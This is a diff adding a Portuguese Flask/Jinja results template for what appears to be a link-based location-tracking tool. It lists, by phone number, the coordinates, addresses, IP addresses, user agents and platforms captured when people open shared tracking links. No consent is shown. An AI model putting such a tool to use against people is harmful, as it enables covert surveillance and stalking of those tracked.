@@ -1,0 +1,120 @@
+{% extends 'base.html' %}
+
+{% block title %}Resultados de Rastreamento{% endblock %}
+
+{% block content %}
+<div class="container">
+    <div class="row mb-4">
+        <div class="col">
+            <h2><i class="fas fa-satellite-dish me-2"></i>Localizações Rastreadas</h2>
+            <p class="text-muted">
+                Esta página mostra todas as localizações capturadas através dos links de rastreamento gerados.
+            </p>
+        </div>
+    </div>
+    
+    {% if tracking_data %}
+        {% for tracking_id, data in tracking_data.items() %}
+            <div class="card shadow mb-4">
+                <div class="card-header bg-primary text-white d-flex justify-content-between align-items-center">
+                    <h4 class="mb-0">
+                        <i class="fas fa-mobile-alt me-2"></i>Número: {{ data.phone_number }}
+                    </h4>
+                    <span class="badge bg-light text-dark">{{ data.locations|length }} localizações</span>
+                </div>
+                
+                <div class="card-body">
+                    <div class="table-responsive">
+                        <table class="table table-hover">
+                            <thead>
+                                <tr>
+                                    <th>Data/Hora</th>
+                                    <th>Endereço</th>
+                                    <th>Coordenadas</th>
+                                    <th>IP</th>
+                                    <th>Plataforma</th>
+                                    <th>Ações</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                {% for location in data.locations %}
+                                <tr>
+                                    <td>{{ location.timestamp.strftime('%d/%m/%Y %H:%M:%S') }}</td>
+                                    <td>
+                                        {{ location.address }}
+                                        {% if location.altitude %}
+                                        <span class="badge bg-info ms-1" title="Altitude">
+                                            {{ location.altitude|round(1) }}m
+                                        </span>
+                                        {% endif %}
+                                    </td>
+                                    <td>
+                                        {% if location.latitude and location.longitude %}
+                                            <span class="text-success fw-bold">{{ location.latitude|round(6) }}, {{ location.longitude|round(6) }}</span>
+                                        {% else %}
+                                            Não disponível
+                                        {% endif %}
+                                    </td>
+                                    <td>
+                                        {{ location.ip_address }}
+                                        <button type="button" class="btn btn-sm btn-outline-secondary ms-1" 
+                                                data-bs-toggle="tooltip" title="{{ location.user_agent }}">
+                                            <i class="fas fa-info-circle"></i>
+                                        </button>
+                                    </td>
+                                    <td>
+                                        {{ location.platform or 'Desconhecido' }}
+                                        <i class="fas {% if 'android' in location.platform|lower %}fa-android text-success{% 
+                                                       elif 'iphone' in location.platform|lower or 'ios' in location.platform|lower %}fa-apple text-secondary{% 
+                                                       elif 'windows' in location.platform|lower %}fa-windows text-primary{% 
+                                                       else %}fa-mobile-alt{% endif %} ms-1"></i>
+                                    </td>
+                                    <td>
+                                        <div class="btn-group">
+                                            {% if location.latitude and location.longitude %}
+                                            <a href="https://www.google.com/maps?q={{ location.latitude }},{{ location.longitude }}" 
+                                               target="_blank" class="btn btn-sm btn-primary" title="Ver no Google Maps">
+                                                <i class="fas fa-map-marker-alt"></i>
+                                            </a>
+                                            <a href="https://wego.here.com/?map={{ location.latitude }},{{ location.longitude }},15,normal" 
+                                               target="_blank" class="btn btn-sm btn-info" title="Ver no HERE Maps">
+                                                <i class="fas fa-globe"></i>
+                                            </a>
+                                            {% endif %}
+                                        </div>
+                                    </td>
+                                </tr>
+                                {% endfor %}
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+                
+                <div class="card-footer">
+                    <a href="{{ url_for('track', tracking_id=tracking_id) }}" 
+                       class="btn btn-outline-primary" target="_blank">
+                        <i class="fas fa-link me-1"></i>Link de Rastreamento
+                    </a>
+                </div>
+            </div>
+        {% endfor %}
+    {% else %}
+        <div class="alert alert-info">
+            <i class="fas fa-info-circle me-2"></i>Nenhum resultado de rastreamento encontrado. 
+            Gere um link de rastreamento e compartilhe-o para começar a rastrear localizações.
+        </div>
+    {% endif %}
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // Inicializar todos os tooltips
+        var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'));
+        var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
+            return new bootstrap.Tooltip(tooltipTriggerEl);
+        });
+    });
+</script>
+{% endblock %}
